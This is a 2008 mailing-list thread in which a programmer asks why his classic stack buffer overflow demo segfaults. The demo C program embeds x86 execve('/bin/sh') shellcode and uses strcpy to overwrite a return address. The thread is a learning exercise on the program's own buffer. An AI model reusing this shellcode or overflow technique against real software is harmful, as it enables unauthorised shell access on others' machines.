From: Varun Chandramohan <varunc@linux.vnet.ibm.com>
Subject: Re: buffer overflow
Date: Wed, 12 Mar 2008 09:58:33 +0530
Message-ID: <47D75BF1.8090102@linux.vnet.ibm.com>
References: <47D621E6.1090403@linux.vnet.ibm.com> <1205229858.4033.12.camel@debian.nordiclan.net> <47D661D0.90905@linux.vnet.ibm.com> <17f2441a0803110649n662264cdp5a4e20361145eac7@mail.gmail.com>
Mime-Version: 1.0
Content-Transfer-Encoding: QUOTED-PRINTABLE
Return-path: <linux-c-programming-owner@vger.kernel.org>
In-Reply-To: <17f2441a0803110649n662264cdp5a4e20361145eac7@mail.gmail.com>
Sender: linux-c-programming-owner@vger.kernel.org
List-ID: <linux-c-programming.vger.kernel.org>
Content-Type: text/plain; charset="iso-8859-1"
To: =?ISO-8859-1?Q?Alfeiks_Ka=E4noken?= <akaanoken@gmail.com>
Cc: RTL <rtl@codehack.se>, linux-c-programming@vger.kernel.org

Alfeiks Ka=E4noken wrote:
> Hi,
> sigsegv is ok for your code - it's points that you tried to access to=
 the
> non-process space - i.e. on wrong pointer address (the system don't c=
are
> where it is).
> There are no stack overflow or something else, you can expect more
> information via debugger, but
> usually if you get a stack overflow with gdb - you can get unknown
> backtrace.
>
> BTW, could you explain your target ?
>
>  =20
My intention was to create a classic buffer overflow as shown in many
docs on the internet. But i believe that it doesnt work out of the box
because of all the different compiler changes. So i need to know in my
compiler how stack is organized so that i can create the overflow.
Regards,
Varun
> On 11/03/2008, Varun Chandramohan <varunc@linux.vnet.ibm.com> wrote:
>  =20
>> Patrik B=E5t wrote:
>>    =20
>>> tis 2008-03-11 klockan 11:38 +0530 skrev Varun Chandramohan:
>>>
>>>      =20
>>>> Hi all,
>>>>
>>>>              Can someone tell me whats is wrong with this program?=
 All
>>>>        =20
>> i
>>    =20
>>>> get is seg fault. Iam trying to create a stack overflow and exec a
>>>> shell. Somehow its not working. The system is x86 on linux.
>>>> gcc (GCC) 4.1.1 20070105 (Red Hat 4.1.1-52)
>>>> Copyright (C) 2006 Free Software Foundation, Inc.
>>>> This is free software; see the source for copying conditions.  The=
re is
>>>>        =20
>> NO
>>    =20
>>>> warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR
>>>>        =20
>> PURPOSE.
>>    =20
>>>>
>>>> The Code:
>>>> #include <stdio.h>
>>>> #include <string.h>
>>>>
>>>> char shellcode[] =3D
>>>>
>>>>        =20
>> "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
>>    =20
>> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
>>    =20
>>>>         "\x80\xe8\xdc\xff\xff\xff/bin/sh";
>>>> #if 0
>>>> char shellcode[] =3D
>>>>
>>>>        =20
>> "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
>>    =20
>> "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
>>    =20
>> "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
>>    =20
>>>>         "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
>>>>
>>>> #endif
>>>>
>>>> char large_string[128];
>>>> int main() {
>>>>   char buffer[96];
>>>>   int i;
>>>>   long *long_ptr =3D (long *) large_string;
>>>>   memset(&buffer,0,sizeof(buffer));
>>>>
>>>>   for (i =3D 0; i < 32; i++)
>>>>     *(long_ptr + i) =3D  (long)&buffer;
>>>>
>>>>   for (i =3D 0; i < strlen(shellcode); i++)
>>>>     large_string[i] =3D shellcode[i];
>>>>
>>>>   strcpy(buffer,large_string);
>>>>
>>>>        =20
>>> strcpy(large_string,buffer);
>>>
>>> //This is working tho...
>>>
>>>      =20
>> Thanks for the reply, but this doesnt spawn a shell, does it? This
>> simply avoids the sigsegv
>>
>>    =20
>>>> }
>>>>
>>>> --
>>>> To unsubscribe from this list: send the line "unsubscribe
>>>>        =20
>> linux-c-programming" in
>>    =20
>>>> the body of a message to majordomo@vger.kernel.org
>>>> More majordomo info at  http://vger.kernel.org/majordomo-info.html
>>>>
>>>>        =20
>>> --
>>> To unsubscribe from this list: send the line "unsubscribe
>>>      =20
>> linux-c-programming" in
>>    =20
>>> the body of a message to majordomo@vger.kernel.org
>>> More majordomo info at  http://vger.kernel.org/majordomo-info.html
>>>
>>>      =20
>> --
>> To unsubscribe from this list: send the line "unsubscribe
>> linux-c-programming" in
>> the body of a message to majordomo@vger.kernel.org
>> More majordomo info at  http://vger.kernel.org/majordomo-info.html
>>
>>    =20
>
>
>
>  =20

--
To unsubscribe from this list: send the line "unsubscribe linux-c-progr=
amming" in
the body of a message to majordomo@vger.kernel.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
